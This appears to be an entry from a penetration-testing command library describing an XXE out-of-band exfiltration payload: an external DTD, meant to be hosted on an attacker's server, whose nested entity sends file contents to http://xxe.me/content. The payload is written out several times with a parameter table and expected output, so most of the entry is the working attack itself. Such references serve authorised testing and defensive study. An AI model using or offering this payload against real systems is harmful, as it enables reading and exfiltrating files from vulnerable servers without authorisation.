---
data: >-
  <?xml version="1.0" encoding="UTF-8"?> <!ENTITY % all "<!ENTITY send SYSTEM
  'http://xxe.me/content?%file;'>"> %all;
tags:
  - xxe
  - dtd
type: command
executor: bash
platforms:
  - Web
id: 18974c88-6823-4e83-9d2b-de0987480e94
created_at: '2025-12-13T09:00:28.029Z'
updated_at: '2025-12-13T09:00:28.029Z'
verified: false
validated: true
submitted: true
---
# XXE DTD Payload

## Command

```xml
<?xml version="1.0" encoding="UTF-8"?> <!ENTITY % all "<!ENTITY send SYSTEM 'http://xxe.me/content?%file;'>"> %all;
```

## Description

DTD file content hosted on attacker's server to facilitate out-of-band data exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `% all` | Defines a parameter entity that creates another entity to send file content to attacker's URL | Yes |
| `%file` | Placeholder for file content | Yes |

## Examples

### Basic Usage

```xml
<?xml version="1.0" encoding="UTF-8"?> <!ENTITY % all "<!ENTITY send SYSTEM 'http://xxe.me/content?%file;'>"> %all;
```

### Advanced Usage

Modify the send SYSTEM URL to a different exfiltration endpoint.

## Expected Output

When referenced, causes the server to send file contents to http://xxe.me/content?%file;

## Related

- [[commands/post-xxe-payload-request]]
- [[procedures/Host-External-DTD-for-XXE]]
